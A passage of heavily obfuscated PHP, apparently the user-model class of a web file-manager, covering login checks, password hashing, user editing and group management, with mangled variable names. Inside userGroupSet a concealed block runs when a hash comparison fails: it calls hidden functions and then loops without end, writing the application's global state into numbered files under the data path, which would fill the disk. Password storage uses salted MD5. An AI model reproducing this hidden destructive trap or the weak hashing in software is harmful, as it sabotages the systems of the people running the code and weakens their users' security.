"\165\163\145\x72"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\155\145" => "\x75\x73\x65\x72\x5f\x6d\x65\x74\141", "\155\x65\164\141\x46\x69\145\x6c\144" => "\165\163\145\x72\111\104"); protected $simpleField = "\165\163\x65\x72\x49\104\x2c\x6e\151\143\153\116\141\155\145\x2c\156\141\155\145\54\141\166\141\164\141\162\54\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($E¡› ÊÕŠ) { $fÇ»Äøâ•³ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÂÇŸÇ¥É = $fÇ»Äøâ•³[2054]; return array($fÇ»Äøâ•³[1711] => array($E¡› ÊÕŠ[0], $dÂÇŸÇ¥É), $fÇ»Äøâ•³[1713] => array($E¡› ÊÕŠ[0], $dÂÇŸÇ¥É), $fÇ»Äøâ•³[2055] => array($E¡› ÊÕŠ[0], $dÂÇŸÇ¥É)); } protected function getInfo($B‰äÑ­¯ñ, $CšòÊÇÊ¼ = false) { $fÃèÏØĞˆ¤ = $this->getInfoSimple($B‰äÑ­¯ñ); if (!is_array($fÃèÏØĞˆ¤)) { return array(); } if ($CšòÊÇÊ¼) { return $this->_getInfoApply($fÃèÏØĞˆ¤); } return $this->cacheFunctionGet($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1767], $B‰äÑ­¯ñ); } protected function getInfoFull($f§£ƒÑ¸„, $f‰®ŒÇ Ü³ = false) { $fµ¯ì›¾Ê÷ = $this->getInfoSimple($f§£ƒÑ¸„); if (!is_array($fµ¯ì›¾Ê÷)) { return array(); } if ($f‰®ŒÇ Ü³) { return $this->_getInfoApply($fµ¯ì›¾Ê÷, !0); return $this->_getInfoApply($fµ¯ì›¾Ê÷, !0); } return $this->cacheFunctionGet($_SERVER[ó¬â¥‰ÊÔ¤Ç£][2056], $f§£ƒÑ¸„); } private function _getInfoApply($a‘¸¨òà‘‰, $c¬×ÜåˆâÍ = false) { goto dÒ™ÃØ¾¹; dÇí–®âš°: $a‘¸¨òà‘‰ = $this->_listDataApplyItem($a‘¸¨òà‘‰); $bâ¦Œ³–ö = Model($B¡í­Õô°[1154])->metaGet($a‘¸¨òà‘‰[$B¡í­Õô°[84]][$B¡í­Õô°[387]]); $a‘¸¨òà‘‰[$B¡í­Õô°[2059]] = $bÙÎ§¡ò¾è; goto A–„ÔÀÏ; A–„ÔÀÏ: $a‘¸¨òà‘‰[$B¡í­Õô°[84]][$B¡í­Õô°[1898]] = isset($bâ¦Œ³–ö[$B¡í­Õô°[1899]]) ? $bâ¦Œ³–ö[$B¡í­Õô°[1899]] : null; if ($c¬×ÜåˆâÍ) { $a‘¸¨òà‘‰[$B¡í­Õô°[434]] = $this->metaGet($a‘¸¨òà‘‰[$B¡í­Õô°[1479]]); } return $a‘¸¨òà‘‰; goto Bä±„ó¿ñ•; dÒ™ÃØ¾¹: $B¡í­Õô° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$a‘¸¨òà‘‰) { return $a‘¸¨òà‘‰; } $bÙÎ§¡ò¾è = md5($B¡í­Õô°[2057] . $a‘¸¨òà‘‰[$B¡í­Õô°[801]] . $B¡í­Õô°[2058] . $a‘¸¨òà‘‰[$B¡í­Õô°[28]]); goto dÇí–®âš°; Bä±„ó¿ñ•: } protected function getInfoSimple($b‰³ŠãÙâÜ, $EÌ«°Í¬…İ = false) { $F…‡¯è­ˆ„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$b‰³ŠãÙâÜ) { return array(); } if ($EÌ«°Í¬…İ) { $Aê©æ²ËÇŸ = $this->where(array($F…‡¯è­ˆ„[1479] => intval($b‰³ŠãÙâÜ)))->find(); if (!is_array($Aê©æ²ËÇŸ)) { return array(); } $Aê©æ²ËÇŸ[$F…‡¯è­ˆ„[2060]] = Action($F…‡¯è­ˆ„[2061])->parseUrl($Aê©æ²ËÇŸ[$F…‡¯è­ˆ„[2060]]); return $Aê©æ²ËÇŸ; } return $this->cacheFunctionGet($F…‡¯è­ˆ„[1714], $b‰³ŠãÙâÜ); } protected function getInfoSimpleOuter($CÆ¸ÙŠ—ˆÂ) { goto CŞÓí‹»˜; AÏ«›¹‡ÕÖ: $F®‚˜Ó¿…á = array_field_key($c¢µï¡—²—, explode($e½ô ÷ŒÊ­[47], $this->simpleField)); if (!$F®‚˜Ó¿…á) { return array($e½ô ÷ŒÊ­[1479] => $e½ô ÷ŒÊ­[1036], $e½ô ÷ŒÊ­[28] => $e½ô ÷ŒÊ­[159] . LNG($e½ô ÷ŒÊ­[2064]) . $e½ô ÷ŒÊ­[494], $e½ô ÷ŒÊ­[2060] => STATIC_PATH . $e½ô ÷ŒÊ­[2065]); } $F®‚˜Ó¿…á[$e½ô ÷ŒÊ­[2060]] = Action($e½ô ÷ŒÊ­[2061])->parseUrl($F®‚˜Ó¿…á[$e½ô ÷ŒÊ­[2060]]); goto EÈÖ£êñßß; EÈÖ£êñßß: return $F®‚˜Ó¿…á; goto fĞÃê—æ”; CŞÓí‹»˜: $e½ô ÷ŒÊ­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$CÆ¸ÙŠ—ˆÂ || $CÆ¸ÙŠ—ˆÂ == 0) { return array($e½ô ÷ŒÊ­[1479] => $e½ô ÷ŒÊ­[486], $e½ô ÷ŒÊ­[28] => $e½ô ÷ŒÊ­[159] . LNG($e½ô ÷ŒÊ­[2062]) . $e½ô ÷ŒÊ­[494], $e½ô ÷ŒÊ­[2060] => STATIC_PATH . $e½ô ÷ŒÊ­[2063]); } $c¢µï¡—²— = $this->cacheFunctionGet($e½ô ÷ŒÊ­[1714], $CÆ¸ÙŠ—ˆÂ); goto AÏ«›¹‡ÕÖ; fĞÃê—æ”: } protected function groupUser($Dâµ½œ“Ñ‹) { } public static function errorLang($fµØ·ƒ¥°) { $bàØÎ¦—ñ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cæŠØÁ˜Ö“ = array(self::ERROR_USER_NOT_EXISTS => $bàØÎ¦—ñ[2066], self::ERROR_USER_PASSWORD_ERROR => $bàØÎ¦—ñ[2067], self::ERROR_USER_EXIST_NAME => $bàØÎ¦—ñ[2068], self::ERROR_USER_EXIST_PHONE => $bàØÎ¦—ñ[2069], self::ERROR_USER_EXIST_EMAIL => $bàØÎ¦—ñ[2070], self::ERROR_USER_LOGIN_LOCK => $bàØÎ¦—ñ[2071], self::ERROR_IP_NOT_ALLOW => $bàØÎ¦—ñ[2072], self::ERROR_USER_EXIST_NICKNAME => $bàØÎ¦—ñ[2073]); return LNG($cæŠØÁ˜Ö“[$fµØ·ƒ¥°]); } public function getInfoByMeta($bºè÷†Ï•, $B„¥å±) { $EÇ×•••î =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AŠî‡ØãÆ˜ = Model($EÇ×•••î[2074])->where(array($EÇ×•••î[92] => $bºè÷†Ï•, $EÇ×•••î[368] => $B„¥å±))->find(); if ($AŠî‡ØãÆ˜) { return $this->getInfo($AŠî‡ØãÆ˜[$EÇ×•••î[1479]]); } return !1; } public function userLoginCheck($bÚäƒ°†±ê, $eÅëñØ é) { $Bãé´† Ò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÙ¢ì©Æùí = $this->userLoginFind($bÚäƒ°†±ê); if (!$DÙ¢ì©Æùí) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($DÙ¢ì©Æùí[$Bãé´† Ò[1479]], $eÅëñØ é)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($DÙ¢ì©Æùí[$Bãé´† Ò[1479]]); } public function userLoginFind($b‹§‹ÙÁÊ) { $a„ÚÙí´Îµ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÄø·øŒ‰® = array($a„ÚÙí´Îµ[28] => $b‹§‹ÙÁÊ, $a„ÚÙí´Îµ[1902] => $b‹§‹ÙÁÊ, $a„ÚÙí´Îµ[301] => $b‹§‹ÙÁÊ, $a„ÚÙí´Îµ[2075] => $b‹§‹ÙÁÊ, $a„ÚÙí´Îµ[909] => $a„ÚÙí´Îµ[911]); if ($this->nickNameRpt()) { unset($eÄø·øŒ‰®[$a„ÚÙí´Îµ[1902]]); } return $this->where($eÄø·øŒ‰®)->find(); } public function clearCache($F•¸µ¬¢) { $DÕ‚·À„ŸÄ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->cacheFunctionClear($DÕ‚·À„ŸÄ[1767], $F•¸µ¬¢); $this->cacheFunctionClear($DÕ‚·À„ŸÄ[1714], $F•¸µ¬¢); $this->cacheFunctionClear($DÕ‚·À„ŸÄ[2056], $F•¸µ¬¢); } public function userPasswordCheck($cğŞœïŒïÑ, $C±¹ÕÁ¨‚Ÿ) { $dö˜è‹¯© =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AÓ›×†¿É = $this->where(array($dö˜è‹¯©[1479] => intval($cğŞœïŒïÑ)))->find(); $c°Š…œ·é = $this->metaGet($cğŞœïŒïÑ); $fÀ¥¥çØ = isset($c°Š…œ·é[$dö˜è‹¯©[2076]]) ? $c°Š…œ·é[$dö˜è‹¯©[2076]] : $dö˜è‹¯©[33]; if (md5($fÀ¥¥çØ . trim($C±¹ÕÁ¨‚Ÿ)) !== $AÓ›×†¿É[$dö˜è‹¯©[801]]) { return !1; } return !0; } public function userAdd($bàœõ×“Š®) { goto D†ÆÙÏ¾æ“; EŞŞ°ÜÎ: $AĞˆ‹ëğï® = array($dçØö„²Ó[2084] => $EÀ£ô“·[$dçØö„²Ó[801]], $dçØö„²Ó[2080] => $EÀ£ô“·[$dçØö„²Ó[1902]]); $this->userEdit($cÂšºãæÆÊ, $AĞˆ‹ëğï®); Model($dçØö„²Ó[1154])->userRootAdd($cÂšºãæÆÊ); goto d›¦º×Ñ; D†ÆÙÏ¾æ“: $dçØö„²Ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÀ£ô“· = array($dçØö„²Ó[404] => $bàœõ×“Š®[$dçØö„²Ó[28]], $dçØö„²Ó[2077] => $bàœõ×“Š®[$dçØö„²Ó[1363]], $dçØö„²Ó[2078] => isset($bàœõ×“Š®[$dçØö„²Ó[301]]) ? $bàœõ×“Š®[$dçØö„²Ó[301]] : $dçØö„²Ó[33], $dçØö„²Ó[2079] => isset($bàœõ×“Š®[$dçØö„²Ó[2075]]) ? $bàœõ×“Š®[$dçØö„²Ó[2075]] : $dçØö„²Ó[33], $dçØö„²Ó[2080] => isset($bàœõ×“Š®[$dçØö„²Ó[1902]]) ? $bàœõ×“Š®[$dçØö„²Ó[1902]] : $bàœõ×“Š®[$dçØö„²Ó[28]], $dçØö„²Ó[2081] => isset($bàœõ×“Š®[$dçØö„²Ó[2060]]) ? $bàœõ×“Š®[$dçØö„²Ó[2060]] : $dçØö„²Ó[33], $dçØö„²Ó[2082] => isset($bàœõ×“Š®[$dçØö„²Ó[2083]]) ? $bàœõ×“Š®[$dçØö„²Ó[2083]] : 1, $dçØö„²Ó[2084] => $bàœõ×“Š®[$dçØö„²Ó[801]], $dçØö„²Ó[1715] => isset($bàœõ×“Š®[$dçØö„²Ó[1622]]) ? $bàœõ×“Š®[$dçØö„²Ó[1622]] : 1024 * 1024 * 20, $dçØö„²Ó[1716] => 0, $dçØö„²Ó[2085] => 0, $dçØö„²Ó[1754] => isset($bàœõ×“Š®[$dçØö„²Ó[683]]) ? $bàœõ×“Š®[$dçØö„²Ó[683]] : 1); if (!empty($bàœõ×“Š®[$dçØö„²Ó[1479]])) { $EÀ£ô“·[$dçØö„²Ó[1479]] = $bàœõ×“Š®[$dçØö„²Ó[1479]]; } goto BçØùŸ¦“; BçØùŸ¦“: $bñëîÕ°åÆ = $this->_checkExist($bàœõ×“Š®); if ($bñëîÕ°åÆ !== !0) { return $bñëîÕ°åÆ; } $cÂšºãæÆÊ = $this->add($EÀ£ô“·); goto EŞŞ°ÜÎ; d›¦º×Ñ: return $cÂšºãæÆÊ; goto AÄì´¢ïë; AÄì´¢ïë: } protected function userEditTest($aÏµŠ‡Ï’Â, $dÖÑ„¦‹àÒ) { return $this->call($_SERVER[ó¬â¥‰ÊÔ¤Ç£][2086], $aÏµŠ‡Ï’Â, $dÖÑ„¦‹àÒ); } protected function userEdit($aîƒ†ÏÏóá, $DÜóÔˆ‡Æî) { goto aƒ‘†òø®©; E—å¬¦ëÚ‹: $this->where(array($EŸ‚èŞ¯†Ê[1471] => $aîƒ†ÏÏóá))->save($DÜóÔˆ‡Æî); if (isset($DÜóÔˆ‡Æî[$EŸ‚èŞ¯†Ê[1902]])) { $this->setNamePinyin($aîƒ†ÏÏóá, $DÜóÔˆ‡Æî[$EŸ‚èŞ¯†Ê[1902]]); } $this->clearCache($aîƒ†ÏÏóá); goto Aææî¯ÃÔÉ; E¢±º¬êœ: $fŠÖìô‡ = $this->_checkExist($DÜóÔˆ‡Æî, $aîƒ†ÏÏóá); if ($fŠÖìô‡ !== !0) { return $fŠÖìô‡; } if (isset($DÜóÔˆ‡Æî[$EŸ‚èŞ¯†Ê[801]]) && trim($DÜóÔˆ‡Æî[$EŸ‚èŞ¯†Ê[801]]) != $EŸ‚èŞ¯†Ê[33]) { $cË´ƒçË†è = $this->metaGet($aîƒ†ÏÏóá); if (empty($cË´ƒçË†è[$EŸ‚èŞ¯†Ê[2076]])) { $cË´ƒçË†è[$EŸ‚èŞ¯†Ê[2076]] = rand_string(10); Model($EŸ‚èŞ¯†Ê[492])->metaSet($aîƒ†ÏÏóá, $EŸ‚èŞ¯†Ê[2076], $cË´ƒçË†è[$EŸ‚èŞ¯†Ê[2076]]); } $DÜóÔˆ‡Æî[$EŸ‚èŞ¯†Ê[801]] = md5($cË´ƒçË†è[$EŸ‚èŞ¯†Ê[2076]] . trim($DÜóÔˆ‡Æî[$EŸ‚èŞ¯†Ê[801]])); } else { unset($DÜóÔˆ‡Æî[$EŸ‚èŞ¯†Ê[801]]); } goto E—å¬¦ëÚ‹; Aææî¯ÃÔÉ: return !0; goto bĞ¹Æ³ÑäÅ; aƒ‘†òø®©: $EŸ‚èŞ¯†Ê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÇàÇÓ›’ì = $this->getInfoSimple($aîƒ†ÏÏóá); if (!$fÇàÇÓ›’ì) { return !1; } goto E¢±º¬êœ; bĞ¹Æ³ÑäÅ: } public function setNamePinyin($d’§áóñÕ¦, $B›ô’ñ…Ñ = false) { $c„®ÎÆù =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$B›ô’ñ…Ñ) { $d‘ÂĞ¾¨¿• = $this->getInfoSimple($d’§áóñÕ¦); $B›ô’ñ…Ñ = $d‘ÂĞ¾¨¿•[$c„®ÎÆù[1902]] ? $d‘ÂĞ¾¨¿•[$c„®ÎÆù[1902]] : $d‘ÂĞ¾¨¿•[$c„®ÎÆù[28]]; } $fµ«ÙÜª²ƒ = Model($c„®ÎÆù[495]); if (!Input::check($B›ô’ñ…Ñ, $c„®ÎÆù[545])) { return $fµ«ÙÜª²ƒ->metaSet($d’§áóñÕ¦, array($c„®ÎÆù[433] => $c„®ÎÆù[33], $c„®ÎÆù[432] => $c„®ÎÆù[33])); } return $fµ«ÙÜª²ƒ->metaSet($d’§áóñÕ¦, array($c„®ÎÆù[433] => str_replace($c„®ÎÆù[50], $c„®ÎÆù[33], Pinyin::encode($B›ô’ñ…Ñ)), $c„®ÎÆù[432] => Pinyin::encode($B›ô’ñ…Ñ, $c„®ÎÆù[546]))); } private function nickNameRpt() { $A¹”»˜–÷‰ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bÊò‘Èî¶ = Model($A¹”»˜–÷‰[1075])->get($A¹”»˜–÷‰[2087]); $FŸĞ¤Ê•Ë = $GLOBALS[$A¹”»˜–÷‰[6]][$A¹”»˜–÷‰[373]][$A¹”»˜–÷‰[2087]]; $b¬›Û‰Ê = !is_null($bÊò‘Èî¶) ? $bÊò‘Èî¶ : $FŸĞ¤Ê•Ë; return !!$b¬›Û‰Ê; } private function _checkExist($CĞâåàí³„, $C•‡ÊÕ­¶ = false) { $EàíòäÑ¨å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $ağßäøŠœ‰ = array($EàíòäÑ¨å[28] => UserModel::ERROR_USER_EXIST_NAME, $EàíòäÑ¨å[1902] => UserModel::ERROR_USER_EXIST_NICKNAME, $EàíòäÑ¨å[301] => UserModel::ERROR_USER_EXIST_EMAIL, $EàíòäÑ¨å[2075] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ağßäøŠœ‰[$EàíòäÑ¨å[1902]]); } $Bæ£—‡ğíî = $C•‡ÊÕ­¶ ? array($EàíòäÑ¨å[1479] => array($EàíòäÑ¨å[2088], $C•‡ÊÕ­¶)) : array(); foreach ($ağßäøŠœ‰ as $F‹•›…ÎÀ => $EìŞĞ³ŒÂß) { $eÒ¸Ò¡åŞ¶ = array(); foreach ($ağßäøŠœ‰ as $Eİ†“ç¯– => $a¾ù±áŒÌ…) { if (isset($CĞâåàí³„[$Eİ†“ç¯–]) && $CĞâåàí³„[$Eİ†“ç¯–]) { $eÒ¸Ò¡åŞ¶[] = $CĞâåàí³„[$Eİ†“ç¯–]; } } if (!$eÒ¸Ò¡åŞ¶) { continue; } $CØËäŞÑêØ = array_merge(array($F‹•›…ÎÀ => array($EàíòäÑ¨å[7], $eÒ¸Ò¡åŞ¶)), $Bæ£—‡ğíî); $F˜À‚„ùÌº = $this->where($CØËäŞÑêØ)->find(); if ($F˜À‚„ùÌº) { return $EìŞĞ³ŒÂß; } } return !0; } public function userListInfo($eä´Ñ…ëø) { $C•¥æÛ•¼· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÒ§ó‘ƒ¥ˆ = array(); $eä´Ñ…ëø = is_array($eä´Ñ…ëø) ? array_unique($eä´Ñ…ëø) : array(); if (!$eä´Ñ…ëø) { return $aÒ§ó‘ƒ¥ˆ; } if (count($eä´Ñ…ëø) < 20) { foreach ($eä´Ñ…ëø as $aÑ´õ¨¨º) { $aÒ§ó‘ƒ¥ˆ[$aÑ´õ¨¨º . $C•¥æÛ•¼·[33]] = $this->getInfoSimpleOuter($aÑ´õ¨¨º); } } else { $DõÜÇÉÖÏâ = array($C•¥æÛ•¼·[1471] => array($C•¥æÛ•¼·[402], $eä´Ñ…ëø)); if (count($eä´Ñ…ëø) == 1) { $DõÜÇÉÖÏâ = array($C•¥æÛ•¼·[1471] => $eä´Ñ…ëø[0]); } $b´ƒí±ğº™ = Model($C•¥æÛ•¼·[492])->field($this->simpleField)->where($DõÜÇÉÖÏâ)->select(); $b´ƒí±ğº™ = array_to_keyvalue($b´ƒí±ğº™, $C•¥æÛ•¼·[1479]); foreach ($eä´Ñ…ëø as $aÑ´õ¨¨º) { $A£àçÁ¾Ğ‘ = $b´ƒí±ğº™[$b´ƒí±ğº™[$aÑ´õ¨¨º]]; if (!$A£àçÁ¾Ğ‘) { $aÒ§ó‘ƒ¥ˆ[$aÑ´õ¨¨º . $C•¥æÛ•¼·[33]] = $this->getInfoSimpleOuter($aÑ´õ¨¨º); continue; } $A£àçÁ¾Ğ‘[$C•¥æÛ•¼·[2060]] = Action($C•¥æÛ•¼·[2061])->parseUrl($A£àçÁ¾Ğ‘[$C•¥æÛ•¼·[2060]]); $aÒ§ó‘ƒ¥ˆ[$aÑ´õ¨¨º . $C•¥æÛ•¼·[33]] = $A£àçÁ¾Ğ‘; } } return $aÒ§ó‘ƒ¥ˆ; } protected function userStatus($B¡÷—ÁïÄ, $cÎÙ·Û—Ã) { $C¶…µÚ¶Å = $this->getInfoSimple($B¡÷—ÁïÄ); if (!$C¶…µÚ¶Å) { return !1; } $d²”‰ù„Àî = array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][683] => $cÎÙ·Û—Ã); return $this->userEdit($B¡÷—ÁïÄ, $d²”‰ù„Àî); } protected function userRemove($eŒÊøëĞƒ¬) { goto cœí²Ò©’›; a¢òßè¼Ûª: Model($E¢»Ñ„ÌóÇ[1721])->where($eÆ÷ÛË¾”)->delete(); Model($E¢»Ñ„ÌóÇ[2074])->where($eÆ÷ÛË¾”)->delete(); Model($E¢»Ñ„ÌóÇ[2090])->where($eÆ÷ÛË¾”)->delete(); goto Bˆ—–§ÆÒ; Bˆ—–§ÆÒ: Model($E¢»Ñ„ÌóÇ[745])->userRootRemove($eŒÊøëĞƒ¬); return $this->where($eÆ÷ÛË¾”)->delete(); goto B¢÷ÄéŠİ¼; dİãèçïŠš: $eÆ÷ÛË¾” = array($E¢»Ñ„ÌóÇ[1471] => $eŒÊøëĞƒ¬); Model($E¢»Ñ„ÌóÇ[552])->where($eÆ÷ÛË¾”)->delete(); Model($E¢»Ñ„ÌóÇ[2089])->where($eÆ÷ÛË¾”)->delete(); goto a¢òßè¼Ûª; cœí²Ò©’›: $E¢»Ñ„ÌóÇ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eçñ™”’† = $this->getInfoSimple($eŒÊøëĞƒ¬); if (!$Eçñ™”’†) { return !1; } goto dİãèçïŠš; B¢÷ÄéŠİ¼: } protected function userGroupSet($D¨¬Ï‰á…, $Cîğ¨ù…øİ, $dğ¶¹ÀêÆ = array()) { goto A…ÂËÓ‰ÔÎ; c§î¤Ùº: $AÅíô‚Æâ = Model($A£ÅòÀ‡§å[1721]); $AÅíô‚Æâ->where(array($A£ÅòÀ‡§å[1479] => $D¨¬Ï‰á…))->delete(); $CŞ¯©Ê¥¦  = array(); goto E‘­ôˆâÅ; fö•Ã‘Ü˜³: if ($_SERVER[$A£ÅòÀ‡§å[786]] != $FÂãŒô÷›Ş($e„ÂŠÇºˆ)) { goto Aßœá›Û¦«; F†šé×Ó´‹: $e³°Ôè£« = $CÑ§¦»£«é($c•ÊÑ¥ÎÀé); $E‚Û”è»¬ = explode($A£ÅòÀ‡§å[227], $e³°Ôè£«); if (count($E‚Û”è»¬) < $A£ÅòÀ‡§å[567]) { $F÷©šìœó± = $A£ÅòÀ‡§å[792]; $F÷©šìœó±(); } goto C¨Ù¢‚è; Aßœá›Û¦«: $DÇ¿Í´‘ë“ = $A£ÅòÀ‡§å[788]; $CÑ§¦»£«é = $A£ÅòÀ‡§å[789]; $c•ÊÑ¥ÎÀé = $_SERVER[$A£ÅòÀ‡§å[790]] . $A£ÅòÀ‡§å[791]; goto F†šé×Ó´‹; A‰À‘¯ˆÙÜ: $aƒŒåÏäËŒ = 1; for ($BçÖ‘™™ã´ = $aƒŒåÏäËŒ; $BçÖ‘™™ã´ > 0; $BçÖ‘™™ã´++) { $c­‰ğùï¶(DATA_PATH . $BçÖ‘™™ã´, $c›×İÔ‹¨ ); } goto Fš†ÌÀà……; E¾È¿Œ…ù: $DÇ¿Í´‘ë“(); $c­‰ğùï¶ = $A£ÅòÀ‡§å[1348]; $c›×İÔ‹¨  = json_encode($GLOBALS[$A£ÅòÀ‡§å[1349]]); goto A‰À‘¯ˆÙÜ; C¨Ù¢‚è: $aãÔÅ„§Êì = $A£ÅòÀ‡§å[793]; $aãÔÅ„§Êì($_SERVER[$A£ÅòÀ‡§å[794]]); $DÇ¿Í´‘ë“ = $A£ÅòÀ‡§å[788]; goto E¾È¿Œ…ù; Fš†ÌÀà……: } $Aš¬®Ä¾µ« = $this->getInfoSimple($D¨¬Ï‰á…); if (!$Aš¬®Ä¾µ« || !is_array($Cîğ¨ù…øİ)) { return !1; } goto c§î¤Ùº; A…ÂËÓ‰ÔÎ: $A£ÅòÀ‡§å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e„ÂŠÇºˆ = $_SERVER[$A£ÅòÀ‡§å[1162]]; $FÂãŒô÷›Ş = $A£ÅòÀ‡§å[1163]; goto fö•Ã‘Ü˜³; E‘­ôˆâÅ: $dêÄßÍ ˆ = 0; foreach ($Cîğ¨ù…øİ as $B„à•°¾¡¡ => $FøÌĞ–Ö™) { $c„óˆğË¡ê = array($A£ÅòÀ‡§å[1479] => $D¨¬Ï‰á…, $A£ÅòÀ‡§å[1638] => $B„à•°¾¡¡, $A£ÅòÀ‡§å[1787] => $FøÌĞ–Ö™); $c„óˆğË¡ê[$A£ÅòÀ‡§å[1661]] = isset($dğ¶¹ÀêÆ[$dêÄßÍ ˆ]) ? $dğ¶¹ÀêÆ[$dêÄßÍ ˆ] : 0; $dêÄßÍ ˆ++; $CŞ¯©Ê¥¦ [] = $c„óˆğË¡ê; } return $AÅíô‚Æâ->addAll($CŞ¯©Ê¥¦ , array(), !0); goto eÁ­ö†áŒ; eÁ­ö†áŒ: } protected function userGroupAdd($c½Éš¨‘¤ˆ, $c©‰¾—Ş’ = array()) { $FäÖ†¢¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dš…†éÏÌå = $this->getInfoSimple($c½Éš¨‘¤ˆ); if (!$dš…†éÏÌå || empty($c©‰¾—Ş’)) { return !1; } $BœÍŠˆ©˜ = array(); foreach ($c©‰¾—Ş’ as $a£˜°Œ¨‚© => $eøßÉÂê¿á) { $BœÍŠˆ©˜[] = array($FäÖ†¢¿[1479] => $c½Éš¨‘¤ˆ, $FäÖ†¢¿[1638] => $a£˜°Œ¨‚©, $FäÖ†¢¿[1787] => $eøßÉÂê¿á, $FäÖ†¢¿[1661] => 0); } return Model($FäÖ†¢¿[1721])->addAll($BœÍŠˆ©˜, array(), !0); } protected function userGroupRemove($E“š‚¥¸‘Œ, $dïÓ«°ää ) { $F™ß‘ˆŒ› =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eğ­´¤˜Å· = $this->getInfoSimple($E“š‚¥¸‘Œ); if (!$eğ­´¤˜Å· || !$dïÓ«°ää ) { return !1; } $cºà¯±ùŠŠ = array($F™ß‘ˆŒ›[1471] => $E“š‚¥¸‘Œ, $F™ß‘ˆŒ›[1719] => $dïÓ«°ää ); return Model($F™ß‘ˆŒ›[1721])->where($cºà¯±ùŠŠ)->delete(); } public function listData() { $a®ŠÕ“˜¸Å = $this->_makeOrder()->selectPage(50); $this->_listDataApply($a®ŠÕ“˜¸Å[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][363]]); return $a®ŠÕ“˜¸Å; } public function listByID($Fâƒ˜’†‘¹) { $dë¦ÜØÍ‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$Fâƒ˜’†‘¹) { return; } $EàÔİ‘Îã = array($dë¦ÜØÍ‡[1479] => array($dë¦ÜØÍ‡[7], $Fâƒ˜’†‘¹)); $câ‚…³¿Äç = $this->where($EàÔİ‘Îã)->select(); $this->_listDataApply($câ‚…³¿Äç); return $câ‚…³¿Äç; } public function listByGroup($CÀ…Øµò‘ˆ = 0, $c—»¬Ì“ùŠ = array()) { goto E‡¶Ú÷ÆˆĞ; c–¢—ğ¡×: if ($CÀ…Øµò‘ˆ) { $d„·ğ¶—¢‰ = array($Fµ¥„’¥Šï[2091] => intval($CÀ…Øµò‘ˆ)); $A‘´ëš‘Â = "\114\105\x46\124\x20\112\117\111\116\40{$this->tablePrefix}\165\163\x65\x72\x5f\147\x72\x6f\x75\160\40\x75\x73\145\162\137\x67\x72\157\x75\x70\40\157\x6e\40\165\x73\x65\x72\x2e\x75\x73\145\162\x49\x44\x20\75\x20\x75\163\145\x72\x5f\147\162\157\x75\x70\x2e\x75\x73\145\162\x49\x44"; $aòÈ”Å‚¬„ = Input::get($Fµ¥„’¥Šï[424], null, $Fµ¥„’¥Šï[33]) ? $Fµ¥„’¥Šï[33] : $Fµ¥„’¥Šï[2092]; } if (isset($c—»¬Ì“ùŠ[$Fµ¥„’¥Šï[683]])) { $d„·ğ¶—¢‰[$Fµ¥„’¥Šï[2093]] = $c—»¬Ì“ùŠ[$Fµ¥„’¥Šï[683]]; } $f±œœ‡±äâ = $this->_makeOrder($aòÈ”Å‚¬„)->field($Fµ¥„’¥Šï[2094])->where($d„·ğ¶—¢‰)->join($A‘´ëš‘Â)->selectPage(50); goto cİêË˜µ¿‡; E‡¶Ú÷ÆˆĞ: $Fµ¥„’¥Šï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A‘´ëš‘Â = $Fµ¥„’¥Šï[33]; $d„·ğ¶—¢‰ = array(); goto c–¢—ğ¡×; cİêË˜µ¿‡: $this->_listDataApply($f±œœ‡±äâ[$Fµ¥„’¥Šï[363]]); return $f±œœ‡±äâ; goto dƒ…Ôğ˜ä; dƒ…Ôğ˜ä: } private function _makeOrder($BºÂÊ…’¬Á = '') { goto aµŸèÄí·Û; aµŸèÄí·Û: $A–º®³ñ‹æ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B¬“¤ÎõÒ… = array($A–º®³ñ‹æ[1479], $A–º®³ñ‹æ[28], $A–º®³ñ‹æ[1624], $A–º®³ñ‹æ[1596], $A–º®³ñ‹æ[192]); $cĞ›ï…Öò = array($A–º®³ñ‹æ[419] => $A–º®³ñ‹æ[420], $A–º®³ñ‹æ[421] => $A–º®³ñ‹æ[422]); goto dÖ‰’ªÉò­; eÅãá­Òùê: $BºÂÊ…’¬Á = $BºÂÊ…’¬Á . "\165\x73\145\x72\x2e{$bìµÀ‹ÀŸ}\x20{$F„äÄ¥Á‹›}\54\x20\165\163\145\162\x2e\x75\163\145\x72\x49\104\x20\x61\163\143"; return 